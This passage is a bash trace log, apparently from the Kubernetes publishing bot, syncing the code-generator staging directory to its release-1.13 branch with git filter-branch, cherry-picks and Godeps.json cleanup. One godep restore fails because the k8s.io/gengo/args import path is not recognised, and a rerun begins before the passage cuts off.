FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ '[' release-1.13 '!=' master ']'\n>\t+ is-merge-with-master 8f7edec615fb9cd722b7f8310dab3efa25351b7c\n>\t+ grep -q '^Merge remote-tracking branch '\\''origin/master'\\'''\n>\t++ short-commit-message 8f7edec615fb9cd722b7f8310dab3efa25351b7c\n>\t++ git show --format=short -q 8f7edec615fb9cd722b7f8310dab3efa25351b7c\n>\t+ return 1\n>\t+ '[' release-1.13 '!=' master ']'\n>\t+ '[' -n 23dc5401f4e9b985860aeae9657bba1b28c74ff8 ']'\n>\t+ is-merge-with-master 23dc5401f4e9b985860aeae9657bba1b28c74ff8\n>\t+ grep -q '^Merge remote-tracking branch '\\''origin/master'\\'''\n>\t++ short-commit-message 23dc5401f4e9b985860aeae9657bba1b28c74ff8\n>\t++ git show --format=short -q 23dc5401f4e9b985860aeae9657bba1b28c74ff8\n>\t+ return 1\n>\t+ is-merge 33e14149954cd0f41c26137785ede85dc5db45b3\n>\t+ grep -q '^Merge: '\n>\t++ short-commit-message 33e14149954cd0f41c26137785ede85dc5db45b3\n>\t++ git show --format=short -q 33e14149954cd0f41c26137785ede85dc5db45b3\n>\t+ return 1\n>\t+ local pick_args=\n>\t+ is-merge 33e14149954cd0f41c26137785ede85dc5db45b3\n>\t+ grep -q '^Merge: '\n>\t++ short-commit-message 33e14149954cd0f41c26137785ede85dc5db45b3\n>\t++ git show --format=short -q 33e14149954cd0f41c26137785ede85dc5db45b3\n>\t+ return 1\n>\t++ commit-subject 33e14149954cd0f41c26137785ede85dc5db45b3\n>\t++ git show --format=%s -q 33e14149954cd0f41c26137785ede85dc5db45b3\n>\t+ echo 'Cherry-picking k8s.io/kubernetes single-commit 8f7edec615fb9cd722b7f8310dab3efa25351b7c: generated.'\n>\t+ local squash_commits=1\n>\t+ godep-changes 33e14149954cd0f41c26137785ede85dc5db45b3\n>\t+ '[' -n '' ']'\n>\t+ git diff --exit-code --quiet '33e14149954cd0f41c26137785ede85dc5db45b3^' 33e14149954cd0f41c26137785ede85dc5db45b3 -- Godeps/Godeps.json\n>\tCherry-picking k8s.io/kubernetes single-commit 8f7edec615fb9cd722b7f8310dab3efa25351b7c: generated.\n>\t++ commit-date 33e14149954cd0f41c26137785ede85dc5db45b3\n>\t++ git show --format=%aD -q 33e14149954cd0f41c26137785ede85dc5db45b3\n>\t+ GIT_COMMITTER_DATE='Fri, 16 Nov 2018 08:38:57 -0500'\n>\t+ git cherry-pick --keep-redundant-commits 33e14149954cd0f41c26137785ede85dc5db45b3\n>\t+ squash 1\n>\t++ git rev-parse HEAD\n>\t+ local head=9e62780e903b01e9b1a70dc16884da936cd2532d\n>\t+ git reset -q --soft HEAD~1\n>\t++ committer-date 9e62780e903b01e9b1a70dc16884da936cd2532d\n>\t++ git show --format=%cD -q 9e62780e903b01e9b1a70dc16884da936cd2532d\n>\t+ GIT_COMMITTER_DATE='Fri, 16 Nov 2018 08:38:57 -0500'\n>\t+ git commit --allow-empty -q -C 9e62780e903b01e9b1a70dc16884da936cd2532d\n>\t+ '[' -z 23dc5401f4e9b985860aeae9657bba1b28c74ff8 ']'\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t+ for f_mainline_commit in '${f_mainline_commits}' FLUSH_PENDING_MERGE_COMMIT\n>\t+ local k_mainline_commit=\n>\t+ local k_new_pending_merge_commit=\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ k_new_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' -n 23dc5401f4e9b985860aeae9657bba1b28c74ff8 ']'\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT '!=' 23dc5401f4e9b985860aeae9657bba1b28c74ff8 ']'\n>\t+ local dst_parent2=HEAD\n>\t+ '[' release-1.13 '!=' master ']'\n>\t+ is-merge-with-master 23dc5401f4e9b985860aeae9657bba1b28c74ff8\n>\t+ grep -q '^Merge remote-tracking branch '\\''origin/master'\\'''\n>\t++ short-commit-message 23dc5401f4e9b985860aeae9657bba1b28c74ff8\n>\t++ git show --format=short -q 23dc5401f4e9b985860aeae9657bba1b28c74ff8\n>\t+ return 1\n>\t++ commit-subject 23dc5401f4e9b985860aeae9657bba1b28c74ff8\n>\t++ git show --format=%s -q 23dc5401f4e9b985860aeae9657bba1b28c74ff8\n>\tCherry-picking source dropped-merge 23dc5401f4e9b985860aeae9657bba1b28c74ff8: Merge remote-tracking branch 'origin/master' into release-1.13.\n>\t+ echo 'Cherry-picking source dropped-merge 23dc5401f4e9b985860aeae9657bba1b28c74ff8: Merge remote-tracking branch '\\''origin/master'\\'' into release-1.13.'\n>\t++ commit-date 23dc5401f4e9b985860aeae9657bba1b28c74ff8\n>\t++ git show --format=%aD -q 23dc5401f4e9b985860aeae9657bba1b28c74ff8\n>\t+ local 'date=Fri, 16 Nov 2018 20:31:24 -0800'\n>\t+++ commit-message 23dc5401f4e9b985860aeae9657bba1b28c74ff8\n>\t+++ git show --format=%B -q 23dc5401f4e9b985860aeae9657bba1b28c74ff8\n>\t+++ echo\n>\t+++ echo 'Kubernetes-commit: 23dc5401f4e9b985860aeae9657bba1b28c74ff8'\n>\t++ GIT_COMMITTER_DATE='Fri, 16 Nov 2018 20:31:24 -0800'\n>\t++ GIT_AUTHOR_DATE='Fri, 16 Nov 2018 20:31:24 -0800'\n>\t++ git commit-tree -p cb3d3f4c6fa2e2eeb6a07602786cf678413af380 -p HEAD -m 'Merge remote-tracking branch '\\''origin/master'\\'' into release-1.13\n>\n>\n>\tKubernetes-commit: 23dc5401f4e9b985860aeae9657bba1b28c74ff8' 'HEAD^{tree}'\n>\t+ local dst_new_merge=c2090bec4d9b1fb25de3812f868accc2bc9ecbae\n>\t+ git reset -q --hard c2090bec4d9b1fb25de3812f868accc2bc9ecbae\n>\t+ fix-godeps '' '' k8s.io false false true Kubernetes-commit 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' '' = true ']'\n>\t+ local deps=\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=false\n>\t+ local needs_godeps_update=false\n>\t+ local squash=true\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_commit=c2090bec4d9b1fb25de3812f868accc2bc9ecbae\n>\t+ '[' false = true ']'\n>\t+ '[' -f Godeps/Godeps.json ']'\n>\t+ checkout-deps-to-kube-commit Kubernetes-commit ''\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ deps=()\n>\t+ local deps\n>\t+ IFS=,\n>\t+ read -a deps\n>\t++ last-kube-commit Kubernetes-commit HEAD\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ git log --format=%B HEAD\n>\t++ grep '^Kubernetes-commit: '\n>\t++ head -n 1\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t+ local k_last_kube_commit=23dc5401f4e9b985860aeae9657bba1b28c74ff8\n>\t+ '[' -z 23dc5401f4e9b985860aeae9657bba1b28c74ff8 ']'\n>\t++ git-find-merge 23dc5401f4e9b985860aeae9657bba1b28c74ff8 upstream-branch\n>\t++ tail -1\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list '23dc5401f4e9b985860aeae9657bba1b28c74ff8^1..upstream-branch' --first-parent\n>\t+++ git rev-list 23dc5401f4e9b985860aeae9657bba1b28c74ff8..upstream-branch --ancestry-path\n>\t+++ git rev-parse 23dc5401f4e9b985860aeae9657bba1b28c74ff8\n>\t+ local k_last_kube_merge=23dc5401f4e9b985860aeae9657bba1b28c74ff8\n>\t+ local dep_count=0\n>\t+ (( i=0 ))\n>\t+ (( i<0 ))\n>\t+ update-deps-in-godep-json '' k8s.io false Kubernetes-commit\n>\t+ '[' '!' -f Godeps/Godeps.json ']'\n>\t+ local base_package=k8s.io\n>\t+ local is_library=false\n>\t+ local deps=\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ deps_array=()\n>\t+ local deps_array\n>\t+ IFS=,\n>\t+ read -a deps_array\n>\t+ local dep_count=0\n>\t+ (( i=0 ))\n>\t+ (( i<0 ))\n>\t+ indent-godeps\n>\t++ basename /go-workspace/src/k8s.io/code-generator\n>\t+ unexpand --first-only --tabs=2\n>\t++ basename /go-workspace/src/k8s.io/code-generator\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/code-generator/\") or . == \"k8s.io/code-generator\") | not))' Godeps/Godeps.json\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ git add Godeps/Godeps.json\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ echo 'Godeps.json hasn'\\''t changed!'\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\tGodeps.json hasn't changed!\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ '[' release-1.13 '!=' master ']'\n>\t+ '[' -d vendor/ ']'\n>\t+ '[' false = true ']'\n>\t+ '[' -n '' ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ git diff --exit-code c2090bec4d9b1fb25de3812f868accc2bc9ecbae\n>\tRemove redundant godep commits on-top of c2090bec4d9b1fb25de3812f868accc2bc9ecbae.\n>\t+ echo 'Remove redundant godep commits on-top of c2090bec4d9b1fb25de3812f868accc2bc9ecbae.'\n>\t+ git reset --soft -q c2090bec4d9b1fb25de3812f868accc2bc9ecbae\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t+ dst_needs_godeps_update=false\n>\t++ git rev-parse HEAD\n>\t+ dst_merge_point_commit=c2090bec4d9b1fb25de3812f868accc2bc9ecbae\n>\t+ k_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ break\n>\t+ echo 'Fixing up godeps after a complete sync'\n>\tFixing up godeps after a complete sync\n>\t++ git rev-parse HEAD\n>\t+ '[' c2090bec4d9b1fb25de3812f868accc2bc9ecbae '!=' cb3d3f4c6fa2e2eeb6a07602786cf678413af380 ']'\n>\t+ fix-godeps '' '' k8s.io false true true Kubernetes-commit 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' '' = true ']'\n>\t+ local deps=\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=false\n>\t+ local needs_godeps_update=true\n>\t+ local squash=true\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_commit=c2090bec4d9b1fb25de3812f868accc2bc9ecbae\n>\t+ '[' true = true ']'\n>\t+ update_full_godeps '' k8s.io false Kubernetes-commit\n>\t+ local deps=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=false\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t+ for d in '$../*'\n>\t+ '[' '!' -d '$../*' ']'\n>\t+ continue\n>\t+ '[' '!' -f Godeps/Godeps.json ']'\n>\t+ echo 'Removing k8s.io/* dependencies from Godeps.json'\n>\t+ local dep=\n>\t+ local branch=\n>\t+ local depbranch=\n>\tRemoving k8s.io/* dependencies from Godeps.json\n>\t++ basename /go-workspace/src/k8s.io/code-generator\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/code-generator/\") or . == \"k8s.io/code-generator\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\tRunning godep restore.\n>\t+ echo 'Running godep restore.'\n>\t+ godep restore\n>\tgodep: error downloading dep (k8s.io/gengo/args): unrecognized import path \"k8s.io/gengo/args\"\n>\tgodep: Error downloading some deps. Aborting restore and check.\n>[17 Nov 18 07:09 UTC]: exit status 1\n>    \t+ '[' '!' 14 -eq 14 ']'\n>    \t+ REPO=code-generator\n>    \t+ SRC_BRANCH=release-1.13\n>    \t+ DST_BRANCH=release-1.13\n>    \t+ DEPS=\n>    \t+ REQUIRED=\n>    \t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>    \t+ SUBDIR=staging/src/k8s.io/code-generator\n>    \t+ SOURCE_REPO_ORG=kubernetes\n>    \t+ SOURCE_REPO_NAME=kubernetes\n>    \t+ shift 9\n>    \t+ BASE_PACKAGE=k8s.io\n>    \t+ IS_LIBRARY=false\n>    \t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ SKIP_TAGS=\n>    \t+ LAST_PUBLISHED_UPSTREAM_HASH=6ee00b6b1bdf4f55ab1c6b37dcff33ba8fd0041a\n>    \t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS LAST_PUBLISHED_UPSTREAM_HASH\n>    \t++ dirname /publish_scripts/construct.sh\n>    \t+ SCRIPT_DIR=/publish_scripts\n>    \t+ source /publish_scripts/util.sh\n>    \t++ set -o errexit\n>    \t++ set -o nounset\n>    \t++ set -o pipefail\n>    \t++ set -o xtrace\n>    \t+ '[' '!' -f .git/info/attributes ']'\n>    \t+ echo 'Running garbage collection.'\n>    \t+ git gc --auto\n>    \t+ echo 'Fetching from origin.'\n>    \t+ git fetch origin --no-tags --prune\n>    \t+ echo 'Cleaning up checkout.'\n>    \t+ git rebase --abort\n>    \tNo rebase in progress?\n>    \t+ true\n>    \t+ git reset -q --hard\n>    \t+ git clean -q -f -f -d\n>    \t++ git rev-parse HEAD\n>    \t+ git checkout -q 3dcf91f64f638563e5106f21f50c31fa361c918d\n>    \t+ git branch -D release-1.13\n>    \t+ git remote set-head origin -d\n>    \t+ git rev-parse origin/release-1.13\n>    \t+ echo 'Switching to origin/release-1.13.'\n>    \t+ git branch -f release-1.13 origin/release-1.13\n>    \t+ git checkout -q release-1.13\n>    \t+ echo 'Fetching upstream changes.'\n>    \t+ git remote\n>    \t+ grep -w -q upstream\n>    \t+ git remote set-url upstream /go-workspace/src/k8s.io/kubernetes/.git\n>    \t+ git fetch -q upstream --no-tags --prune\n>    \t++ git rev-parse upstream/release-1.13\n>    \t+ UPSTREAM_HASH=06b38709c1fbe35daa9e90f67d15ebbc28fcc191\n>    \t+ '[' 06b38709c1fbe35daa9e90f67d15ebbc28fcc191 '!=' 6ee00b6b1bdf4f55ab1c6b37dcff33ba8fd0041a ']'\n>    \t+ echo 'Upstream branch upstream/release-1.13 moved from '\\''6ee00b6b1bdf4f55ab1c6b37dcff33ba8fd0041a'\\'' to '\\''06b38709c1fbe35daa9e90f67d15ebbc28fcc191'\\''. We have to sync.'\n>    \t+ sync_repo kubernetes kubernetes staging/src/k8s.io/code-generator release-1.13 release-1.13 '' '' k8s.io false 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ local source_repo_org=kubernetes\n>    \t+ local source_repo_name=kubernetes\n>    \t+ local subdirectory=staging/src/k8s.io/code-generator\n>    \t+ local src_branch=release-1.13\n>    \t+ local dst_branch=release-1.13\n>    \t+ local deps=\n>    \t+ local required_packages=\n>    \t+ local base_package=k8s.io\n>    \t+ local is_library=false\n>    \t+ shift 9\n>    \t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    \t+ readonly subdirectory src_branch dst_branch deps is_library\n>    \t+ local new_branch=false\n>    \t+ local orphan=false\n>    \t+ git rev-parse -q --verify HEAD\n>    \t++ ls -1\n>    \t++ wc -l\n>    \t+ '[' 15 = 0 ']'\n>    \t++ git rev-parse HEAD\n>    \t+ echo 'Starting at existing release-1.13 commit cb3d3f4c6fa2e2eeb6a07602786cf678413af380.'\n>    \t+ git branch -D filtered-branch\n>    \t+ git branch -f upstream-branch upstream/release-1.13\n>    \t++ git rev-parse upstream-branch\n>    \t+ echo 'Checked out source commit 06b38709c1fbe35daa9e90f67d15ebbc28fcc191.'\n>    \t+ git checkout -q upstream-branch -b filtered-branch\n>    \t+ git reset -q --hard upstream-branch\n>    \t+ local f_mainline_commits=\n>    \t+ '[' false = true ']'\n>    \t+ '[' false = true ']'\n>    \t++ last-kube-commit Kubernetes-commit release-1.13\n>    \t++ local commit_msg_tag=Kubernetes-commit\n>    \t++ git log --format=%B release-1.13\n>    \t++ grep '^Kubernetes-commit: '\n>    \t++ head -n 1\n>    \t++ sed 's/^Kubernetes-commit: //g'\n>    \t++ true\n>    \t+ local k_base_commit=03aacded1e0e8e9ebf2a84039f02433bb7b38bd0\n>    \t+ '[' -z 03aacded1e0e8e9ebf2a84039f02433bb7b38bd0 ']'\n>    \t++ git-find-merge 03aacded1e0e8e9ebf2a84039f02433bb7b38bd0 upstream/release-1.13\n>    \t++ tail -1\n>    \t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>    \t+++ git rev-list '03aacded1e0e8e9ebf2a84039f02433bb7b38bd0^1..upstream/release-1.13' --first-parent\n>    \t+++ git rev-list 03aacded1e0e8e9ebf2a84039f02433bb7b38bd0..upstream/release-1.13 --ancestry-path\n>    \t+++ git rev-parse 03aacded1e0e8e9ebf2a84039f02433bb7b38bd0\n>    \t+ local k_base_merge=03aacded1e0e8e9ebf2a84039f02433bb7b38bd0\n>    \t+ '[' -z 03aacded1e0e8e9ebf2a84039f02433bb7b38bd0 ']'\n>    \t+ git branch -f filtered-branch-base 03aacded1e0e8e9ebf2a84039f02433bb7b38bd0\n>    \t+ echo 'Rewriting upstream branch release-1.13 to only include commits for staging/src/k8s.io/code-generator.'\n>    \t+ filter-branch Kubernetes-commit staging/src/k8s.io/code-generator 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' filtered-branch filtered-branch-base\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    \t+ local subdirectory=staging/src/k8s.io/code-generator\n>    \t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ echo 'Running git filter-branch ...'\n>    \t+ local index_filter=\n>    \t+ '[' -n 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>    \t+ patterns=()\n>    \t+ local patterns\n>    \t+ local p=\n>    \t+ index_filter='git rm -q --cached --ignore-unmatch -r'\n>    \t+ IFS=' '\n>    \t+ read -ra patterns\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''BUILD'\\'''\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''*/BUILD'\\'''\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''BUILD.bazel'\\'''\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''*/BUILD.bazel'\\'''\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''Gopkg.toml'\\'''\n>    \t+ git filter-branch -f --index-filter 'git rm -q --cached --ignore-unmatch -r '\\''BUILD'\\'' '\\''*/BUILD'\\'' '\\''BUILD.bazel'\\'' '\\''*/BUILD.bazel'\\'' '\\''Gopkg.toml'\\''' --msg-filter 'awk 1 && echo && echo \"Kubernetes-commit: ${GIT_COMMIT}\"' --subdirectory-filter staging/src/k8s.io/code-generator -- filtered-branch filtered-branch-base\n>    \t++ git rev-parse filtered-branch-base\n>    \t+ local f_base_commit=7dfe599611970bfc03d270201b3e27c6651b17c0\n>    \t++ git log --first-parent --format=%H --reverse 7dfe599611970bfc03d270201b3e27c6651b17c0..HEAD\n>    \t+ f_mainline_commits='1367093c3570ee5ff254b76e873a54d6b7fb83c0\n>    \t33e14149954cd0f41c26137785ede85dc5db45b3'\n>    \t+ echo 'Checking out branch release-1.13.'\n>    \t+ git checkout -q release-1.13\n>    \t+ '[' -f kubernetes-sha ']'\n>    \t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>    \t+ local split_recursive_delete_pattern\n>    \t+ read -r -a split_recursive_delete_pattern\n>    \t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>    \t+ git add -u\n>    \t+ git-index-clean\n>    \t+ git diff --cached --exit-code\n>    \t+ return 0\n>    \t++ git rev-parse HEAD\n>    \t+ local dst_old_head=cb3d3f4c6fa2e2eeb6a07602786cf678413af380\n>    \t+ local k_pending_merge_commit=\n>    \t+ local dst_needs_godeps_update=false\n>    \t++ git rev-parse HEAD\n>    \t+ local dst_merge_point_commit=cb3d3f4c6fa2e2eeb6a07602786cf678413af380\n>    \t+ for f_mainline_commit in '${f_mainline_commits}' FLUSH_PENDING_MERGE_COMMIT\n>    \t+ local k_mainline_commit=\n>    \t+ local k_new_pending_merge_commit=\n>    \t+ '[' 1367093c3570ee5ff254b76e873a54d6b7fb83c0 = FLUSH_PENDING_MERGE_COMMIT ']'\n>    \t++ kube-commit Kubernetes-commit 1367093c3570ee5ff254b76e873a54d6b7fb83c0\n>    \t++ local commit_msg_tag=Kubernetes-commit\n>    \t++ commit-message 1367093c3570ee5ff254b76e873a54d6b7fb83c0\n>    \t++ git show --format=%B -q 1367093c3570ee5ff254b76e873a54d6b7fb83c0\n>    \t++ grep '^Kubernetes-commit: '\n>    \t++ sed 's/^Kubernetes-commit: //g'\n>    \t+ k_mainline_commit=493bc79c0432bdb53d87248e18ffcaa5caf9d08d\n>    \t++ git-find-merge 493bc79c0432bdb53d87248e18ffcaa5caf9d08d upstream-branch\n>    \t++ tail -1\n>    \t+++ git rev-list '493bc79c0432bdb53d87248e18ffcaa5caf9d08d^1..upstream-branch' --first-parent\n>    \t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>    \t+++ git rev-list 493bc79c0432bdb53d87248e18ffcaa5caf9d08d..upstream-branch --ancestry-path\n>    \t+++ git rev-parse 493bc79c0432bdb53d87248e18ffcaa5caf9d08d\n>    \t+ k_new_pending_merge_commit=23dc5401f4e9b985860aeae9657bba1b28c74ff8\n>    \t+ '[' 23dc5401f4e9b985860aeae9657bba1b28c74ff8 = 493bc79c0432bdb53d87248e18ffcaa5caf9d08d ']'\n>    \t+ '[' release-1.13 '!=' master ']'\n>    \t+ is-merge-with-master 493bc79c0432bdb53d87248e18ffcaa5caf9d08d\n>    \t+ grep -q '^Merge remote-tracking branch '\\''origin/master'\\'''\n>    \t++ short-commit-message 493bc79c0432bdb53d87248e18ffcaa5caf9d08d\n>    \t++ git show --format=short -q 493bc79c0432bdb53d87248e18ffcaa5caf9d08d\n>    \t+ return 1\n>    \t+ '[' -n '' ']'\n>    \t+ k_pending_merge_commit=23dc5401f4e9b985860aeae9657bba1b28c74ff8\n>    \t+ '[' 1367093c3570ee5ff254b76e873a54d6b7fb83c0 = FLUSH_PENDING_MERGE_COMMIT ']'\n>    \t+ '[' release-1.13 '!=' master ']'\n>    \t+ is-merge-with-master 493bc79c0432bdb53d87248e18ffcaa5caf9d08d\n>    \t+ grep -q '^Merge remote-tracking branch '\\''origin/master'\\'''\n>    \t++ short-commit-message 493bc79c0432bdb53d87248e18ffcaa5caf9d08d\n>    \t++ git show --format=short -q 493bc79c0432bdb53d87248e18ffcaa5caf9d08d\n>    \t+ return 1\n>    \t+ '[' release-1.13 '!=' master ']'\n>    \t+ '[' -n 23dc5401f4e9b985860aeae9657bba1b28c74ff8 ']'\n>    \t+ is-merge-with-master 23dc5401f4e9b985860aeae9657bba1b28c74ff8\n>    \t+ grep -q '^Merge remote-tracking branch '\\''origin/master'\\'''\n>    \t++ short-commit-message 23dc5401f4e9b985860aeae9657bba1b28c74ff8\n>    \t++ git show --format=short -q 23dc5401f4e9b985860aeae9657bba1b28c74ff8\n>    \t+ return 1\n>    \t+ is-merge 1367093c3570ee5ff254b76e873a54d6b7fb83c0\n>    \t+ grep -q '^Merge: '\n>    \t++ short-commit-message 1367093c3570ee5ff254b76e873a54d6b7fb83c0\n>    \t++ git show --format=short -q 1367093c3570ee5ff254b76e873a54d6b7fb83c0\n>    \t+ return 1\n>    \t+ local pick_args=\n>    \t+ is-merge 1367093c3570ee5ff254b76e873a54d6b7fb83c0\n>    \t+ grep -q '^Merge: '\n>    \t++ short-commit-message 1367093c3570ee5ff254b76e873a54d6b7fb83c0\n>    \t++ git show --format=short -q 1367093c3570ee5ff254b76e873a54d6b7fb83c0\n>    \t+ return 1\n>    \t++ commit-subject 1367093c3570ee5ff254b76e873a54d6b7fb83c0\n>    \t++ git show --format=%s -q 1367093c3570ee5ff254b76e873a54d6b7fb83c0\n>    \t+ echo 'Cherry-picking k8s.io/kubernetes single-commit 493bc79c0432bdb53d87248e18ffcaa5caf9d08d: update client generator for local timeout.'\n>    \t+ local squash_commits=1\n>    \t+ godep-changes 1367093c3570ee5ff254b76e873a54d6b7fb83c0\n>    \t+ '[' -n '' ']'\n>    \t+ git diff --exit-code --quiet '1367093c3570ee5ff254b76e873a54d6b7fb83c0^' 1367093c3570ee5ff254b76e873a54d6b7fb83c0 -- Godeps/Godeps.json\n>    \t++ commit-date 1367093c3570ee5ff254b76e873a54d6b7fb83c0\n>    \t++ git show --format=%aD -q 1367093c3570ee5ff254b76e873a54d6b7fb83c0\n>    \t+ GIT_COMMITTER_DATE='Fri, 21 Sep 2018 09:11:54 -0400'\n>    \t+ git cherry-pick --keep-redundant-commits 1367093c3570ee5ff254b76e873a54d6b7fb83c0\n>    \t+ squash 1\n>    \t++ git rev-parse HEAD\n>    \t+ local head=e8427043372d36fe90d4132f46e9ff609a1e447f\n>    \t+ git reset -q --soft HEAD~1\n>    \t++ committer-date e8427043372d36fe90d4132f46e9ff609a1e447f\n>    \t++ git show --format=%cD -q e8427043372d36fe90d4132f46e9ff609a1e447f\n>    \t+ GIT_COMMITTER_DATE='Fri, 21 Sep 2018 09:11:54 -0400'\n>    \t+ git commit --allow-empty -q -C e8427043372d36fe90d4132f46e9ff609a1e447f\n>    \t+ '[' -z 23dc5401f4e9b985860aeae9657bba1b28c74ff8 ']'\n>    \t+ ensure-clean-working-dir\n>    \t+ git diff HEAD --exit-code\n>    \t+ for f_mainline_commit in '${f_mainline_commits}' FLUSH_PENDING_MERGE_COMMIT\n>    \t+ local k_mainline_commit=\n>    \t+ local k_new_pending_merge_commit=\n>    \t+ '[' 33e14149954cd0f41c26137785ede85dc5db45b3 = FLUSH_PENDING_MERGE_COMMIT ']'\n>    \t++ kube-commit Kubernetes-commit 33e14149954cd0f41c26137785ede85dc5db45b3\n>    \t++ local commit_msg_tag=Kubernetes-commit\n>    \t++ commit-message 33e14149954cd0f41c26137785ede85dc5db45b3\n>    \t++ git show --format=%B -q 33e14149954cd0f41c26137785ede85dc5db45b3\n>    \t++ grep '^Kubernetes-commit: '\n>    \t++ sed 's/^Kubernetes-commit: //g'\n>    \t+ k_mainline_commit=8f7edec615fb9cd722b7f8310dab3efa25351b7c\n>    \t++ git-find-merge 8f7edec615fb9cd722b7f8310dab3efa25351b7c upstream-branch\n>    \t++ tail -1\n>    \t+++ git rev-list '8f7edec615fb9cd722b7f8310dab3efa25351b7c^1..upstream-branch' --first-parent\n>    \t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>    \t+++ git rev-list 8f7edec615fb9cd722b7f8310dab3efa25351b7c..upstream-branch --ancestry-path\n>    \t+++ git rev-parse 8f7edec615fb9cd722b7f8310dab3efa25351b7c\n>    \t+ k_new_pending_merge_commit=23dc5401f4e9b985860aeae9657bba1b28c74ff8\n>    \t+ '[' 23dc5401f4e9b985860aeae9657bba1b28c74ff8 = 8f7edec615fb9cd722b7f8310dab3efa25351b7c ']'\n>    \t+ '[' release-1.13 '!=' master ']'\n>    \t+ is-merge-with-master 8f7edec615fb9cd722b7f8310dab3efa25351b7c\n>    \t+ grep -q '^Merge remote-tracking branch '\\''origin/master'\\'''\n>    \t++ short-commit-message 8f7edec615fb9cd722b7f8310dab3efa25351b7c\n>    \t++ git show --format=short -q 8f7edec615fb9cd722b7f8310dab3efa25351b7c\n>    \t+ return 1\n>    